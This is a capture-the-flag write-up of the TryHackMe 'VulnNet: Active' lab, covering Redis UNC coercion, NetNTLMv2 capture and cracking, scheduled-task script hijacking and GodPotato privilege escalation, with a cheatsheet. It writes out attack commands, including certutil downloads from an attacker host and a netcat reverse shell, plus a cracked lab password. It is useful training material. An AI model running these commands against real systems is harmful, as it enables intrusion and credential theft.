![VulnNet Active attack path](/images/lab-writeups/vulnnet-active.svg)

# VulnNet: Active Write-Up

Source: TryHackMe

Difficulty: Medium

Categories: Active Directory, Redis, UNC coercion, Responder, NetNTLMv2, SMB share abuse, scheduled task, SeImpersonatePrivilege, GodPotato

## Nmap

```bash
sudo nmap -p- -sVC -O 10.10.161.36 -T4
```

Important output:

```text
53/tcp    open  domain?
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf .NET Message Framing
49666/tcp open  msrpc
49667/tcp open  msrpc
49669/tcp open  ncacn_http
49671/tcp open  msrpc
49677/tcp open  msrpc
49707/tcp open  msrpc
```

Host script results:

```text
NetBIOS name: VULNNET-BC3TCK1
smb2-security-mode: Message signing enabled and required
clock-skew: -1s
```

## Signal Analysis

The service mix indicated a Domain Controller:

- `53/tcp` DNS
- `135/139/445` RPC and SMB
- `464/tcp` Kerberos password change
- `9389/tcp` Active Directory Web Services

SMB signing was enabled and required, so relaying to SMB on this host was not useful.

The unusual service was Redis on port 6379. Redis does not belong on a Domain Controller. Redis 2.8.2402 is old and often exposes unauthenticated configuration changes.

On Linux, Redis write primitives often lead to SSH key writes, cron writes, or webshell drops. On Windows, the more useful idea was UNC coercion.

## Redis as a Coercion Primitive

Redis can be instructed to write its database file to a path controlled by configuration:

```text
CONFIG SET dir
CONFIG SET dbfilename
SAVE
```

If `dir` is set to a UNC path such as `\\ATTACKER\share`, the Windows service attempts to authenticate to that SMB path. That leaks a NetNTLMv2 challenge-response to Responder.

This reframes Redis from "a data store" into "a process that can be forced to authenticate outbound."

## Attack Chain

```text
Unauthenticated Redis on port 6379
-> Force SMB authentication with UNC path
-> Responder captures NetNTLMv2 for VULNNET\enterprise-security
-> Crack hash with john and rockyou
-> enterprise-security:sand_0873959498
-> Enumerate SMB shares
-> Enterprise-Share is writable
-> Discover PurgeIrrelevantData_1826.ps1
-> Overwrite scheduled script with PowerShell reverse shell
-> Scheduled task runs script
-> Shell as enterprise-security
-> whoami /priv shows SeImpersonatePrivilege
-> GodPotato-NET4 returns SYSTEM shell
```

## Redis Coercion

Start Responder:

```bash
sudo responder -I tun0 -wv
```

Trigger Redis:

```bash
redis-cli -h 10.10.161.36
```

Inside Redis:

```text
CONFIG SET dir \\10.10.X.X\fake
CONFIG SET dbfilename test.rdb
SAVE
```

Responder captured NetNTLMv2 for:

```text
VULNNET\enterprise-security
```

## Cracking NetNTLMv2

Use john or hashcat:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

or:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
sand_0873959498
```

## Authenticated SMB Enumeration

```bash
nxc smb 10.10.161.36 -u enterprise-security -p 'sand_0873959498' --shares
```

Important finding:

```text
Enterprise-Share READ, WRITE
```

A writable share is important because something may consume files from it automatically.

## Scheduled Task Script Hijack

Inside the share, the script was discovered:

```text
PurgeIrrelevantData_1826.ps1
```

Download it:

```bash
smbclient //10.10.161.36/Enterprise-Share -U enterprise-security
get PurgeIrrelevantData_1826.ps1
```

Replace it with a PowerShell reverse shell while preserving the filename:

```bash
put PurgeIrrelevantData_1826.ps1
```

Start listener:

```bash
penelope 4444
```

Wait for the scheduled task to execute.

The callback returned a shell as:

```text
VULNNET\enterprise-security
```

## Privilege Enumeration

Run:

```cmd
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

The key result:

```text
SeImpersonatePrivilege: Enabled
```

That made GodPotato a strong privilege escalation candidate.

## GodPotato to SYSTEM

Host tools:

```bash
python3 -m http.server 8888
```

Download from the target:

```cmd
certutil -urlcache -f -split http://ATTACKER:8888/GodPotato-NET4.exe Potato4.exe
certutil -urlcache -f -split http://ATTACKER:8888/nc.exe nc.exe
```

Run GodPotato:

```cmd
.\Potato4.exe -cmd "cmd /c whoami"
```

SYSTEM shell:

```cmd
.\Potato4.exe -cmd "C:\Users\enterprise-security\Downloads\nc.exe -e cmd.exe ATTACKER 4443"
```

Read:

```cmd
C:\Users\Administrator\Desktop\system.txt
```

## Principles

Outbound authentication is an exploitable primitive. Any service that can be forced to touch a remote UNC path can leak credentials.

SMB signing protects the destination from unsigned relay. It does not prevent a machine or service account from authenticating outward to an attacker-controlled host.

A writable share becomes dangerous when something privileged consumes files from that share.

`whoami /priv` should be run on every Windows shell.

Unexpected services on critical roles are strong signals. Redis on a Domain Controller is the main clue.

## Coercion Triangle

Three conditions enable forced authentication:

1. A service accepts a filesystem path or URI.
2. The service runs as a domain identity.
3. The target can reach the attacker over SMB.

Redis satisfied this through `CONFIG SET dir`.

Other examples of the same shape:

- MSSQL `xp_dirtree`
- SCF file coercion
- PrinterBug and PetitPotam
- SharePoint file or folder retrieval
- Applications that fetch UNC paths

## NetNTLMv2 vs NTLM

NetNTLMv2 is a challenge-response exchange captured over the network. It is usually cracked offline.

NTLM is the stored hash and can often be used directly for pass-the-hash.

Do not confuse the two. The format determines the attack mode.

## Cheatsheet

```bash
redis-cli -h $TARGET
CONFIG SET dir \\ATTACKER\share
CONFIG SET dbfilename a.rdb
SAVE

sudo responder -I tun0 -wv

john h.txt -w=/usr/share/wordlists/rockyou.txt
hashcat -m 5600 h.txt rockyou.txt

nxc smb $TARGET -u enterprise-security -p 'sand_0873959498' --shares
smbmap -H $TARGET -u enterprise-security -p 'sand_0873959498'

certutil -urlcache -f -split http://ATTACKER:8888/GodPotato-NET4.exe Potato4.exe
certutil -urlcache -f -split http://ATTACKER:8888/nc.exe nc.exe
```

## Lessons Learned

When Redis appears on Windows, test whether UNC paths trigger outbound SMB authentication.

Responder is not only for classic LLMNR/NBNS poisoning; it can capture coerced authentication from misconfigured services.

A writable share should always be inspected for scheduled scripts, deployment jobs, backup workflows, and automation.

SeImpersonatePrivilege on modern Windows should immediately lead to Potato-family testing.

GodPotato-NET4 may work where NET35 builds fail, depending on the installed .NET runtime.
